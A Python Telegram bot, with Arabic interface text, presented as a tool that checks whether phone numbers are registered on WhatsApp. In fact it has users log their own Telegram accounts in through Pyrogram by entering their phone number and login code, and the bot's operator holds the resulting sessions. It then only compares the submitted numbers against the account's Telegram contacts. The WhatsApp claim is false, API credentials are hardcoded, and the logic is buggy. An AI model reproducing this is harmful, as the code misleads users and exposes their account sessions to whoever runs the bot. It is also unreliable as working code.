import os
import re
import asyncio
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from pyrogram import Client
import logging

# تفعيل التسجيل
logging.basicConfig(level=logging.INFO)

# متغيرات البيئة
BOT_TOKEN = os.environ.get('BOT_TOKEN')
if not BOT_TOKEN:
    raise ValueError("❌ BOT_TOKEN غير موجود في المتغيرات البيئية")

# بيانات API الخاصة بك
API_ID = 33017923
API_HASH = "3c060f1d3b5d26aa2a6b2475f4ab865c"

# تخزين جلسات المستخدمين
user_sessions = {}
user_states = {}

# دالة لإنشاء عميل Pyrogram جديد
def create_pyrogram_client(user_id, phone_number):
    session_name = f"session_{user_id}"
    return Client(
        session_name,
        api_id=API_ID,
        api_hash=API_HASH,
        phone_number=phone_number
    )

# أمر /start
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_states[user_id] = {'step': 'idle'}
    await update.message.reply_text(
        "👋 أهلاً بك في بوت فحص واتساب!\n\n"
        "📱 أرسل /pair لتسجيل الدخول عبر Pair Code.\n"
        "✅ بعد التسجيل، أرسل الأرقام المراد فحصها.\n\n"
        "مثال:\n"
        "+966512345678\n"
        "+971501234567"
    )

# أمر /pair
async def pair(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_states[user_id] = {'step': 'waiting_phone'}
    await update.message.reply_text(
        "📱 أرسل رقم هاتفك مع رمز الدولة:\n"
        "مثال: +966512345678\n\n"
        "⚠️ تأكد من كتابة علامة + قبل الرقم"
    )

# معالجة الرسائل النصية
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text

    # إذا كان المستخدم في خطوة انتظار رقم الهاتف
    if user_states.get(user_id, {}).get('step') == 'waiting_phone':
        phone = text.strip()
        
        # التحقق من صحة الرقم
        if not re.match(r'^\+\d{10,15}$', phone):
            await update.message.reply_text(
                "❌ الرقم غير صحيح. أرسل رقم مع رمز الدولة مثل:\n"
                "+966512345678\n\n"
                "⚠️ تأكد من وجود علامة + في البداية"
            )
            return

        await update.message.reply_text(f"⏳ جاري تسجيل الدخول للرقم: {phone}")
        
        try:
            # إنشاء عميل Pyrogram
            client = create_pyrogram_client(user_id, phone)
            
            # بدء العميل
            await client.start()
            
            # إرسال كود الاقتران
            await update.message.reply_text(
                f"🔑 *تم إرسال كود الاقتران*\n\n"
                f"📱 تم إرسال الكود إلى رقم: {phone}\n"
                f"📝 أرسل الكود الآن (مثال: 12345)"
            )
            
            user_states[user_id]['client'] = client
            user_states[user_id]['step'] = 'waiting_code'
            user_states[user_id]['phone'] = phone
            
        except Exception as e:
            await update.message.reply_text(
                f"❌ حدث خطأ: {str(e)}\n\n"
                "🔄 حاول مرة أخرى باستخدام /pair"
            )
            user_states[user_id] = {'step': 'idle'}
        return

    # إذا كان المستخدم في خطوة انتظار الكود
    if user_states.get(user_id, {}).get('step') == 'waiting_code':
        code = text.strip()
        client = user_states[user_id].get('client')
        
        if not client:
            await update.message.reply_text("❌ يرجى استخدام /pair للمحاولة مرة أخرى")
            return
        
        try:
            # تأكيد الكود
            await client.sign_in(user_states[user_id]['phone'], code)
            
            await update.message.reply_text(
                "✅ *تم تسجيل الدخول بنجاح!*\n\n"
                "📊 يمكنك الآن إرسال الأرقام للفحص.\n"
                "📝 أرسل رقم واحد لكل سطر."
            )
            
            user_states[user_id]['step'] = 'ready'
            
        except Exception as e:
            await update.message.reply_text(
                f"❌ الكود غير صحيح: {str(e)}\n\n"
                "🔄 استخدم /pair للمحاولة مرة أخرى"
            )
            user_states[user_id] = {'step': 'idle'}
        return

    # إذا كان المستخدم جاهزًا للفحص
    if user_states.get(user_id, {}).get('step') == 'ready':
        client = user_states[user_id].get('client')
        
        if not client:
            await update.message.reply_text("❌ يرجى تسجيل الدخول أولاً باستخدام /pair")
            user_states[user_id] = {'step': 'idle'}
            return

        # تقسيم النص إلى أرقام
        numbers = [n.strip() for n in text.split('\n') if n.strip()]
        
        if not numbers:
            await update.message.reply_text("❌ لم يتم إرسال أي أرقام.")
            return

        await update.message.reply_text(f"⏳ جاري فحص {len(numbers)} رقم...")

        results = []
        for num in numbers:
            try:
                # تنظيف الرقم
                clean_num = num.replace(' ', '')
                
                # التحقق من الرقم في واتساب باستخدام Pyrogram
                try:
                    # محاولة الحصول على معلومات المستخدم
                    contact = await client.get_contacts()
                    # التحقق إذا كان الرقم موجود في جهات الاتصال
                    is_registered = False
                    for contact in contact:
                        if contact.phone_number and contact.phone_number.replace(' ', '') == clean_num:
                            is_registered = True
                            break
                    
                    results.append(f"{clean_num}: {'✅ مسجل' if is_registered else '❌ غير مسجل'}")
                except:
                    results.append(f"{clean_num}: ⚠️ خطأ في الفحص")
                
            except Exception as e:
                results.append(f"{num}: ⚠️ خطأ في الفحص")

        await update.message.reply_text(
            f"📊 *نتائج الفحص:*\n\n" +
            "\n".join(results) +
            f"\n\n📈 تم فحص {len(results)} رقم."
        )
    
    else:
        await update.message.reply_text(
            "👋 مرحباً!\n\n"
            "📱 استخدم /pair لتسجيل الدخول أولاً.\n"
            "✅ بعد ذلك أرسل الأرقام للفحص."
        )

# تشغيل البوت
def main():
    # إنشاء التطبيق
    application = Application.builder().token(BOT_TOKEN).build()
    
    # إضافة المعالجات
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("pair", pair))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    # بدء البوت
    print("✅ بوت تيليجرام يعمل...")
    application.run_polling()

if __name__ == '__main__':
    main()
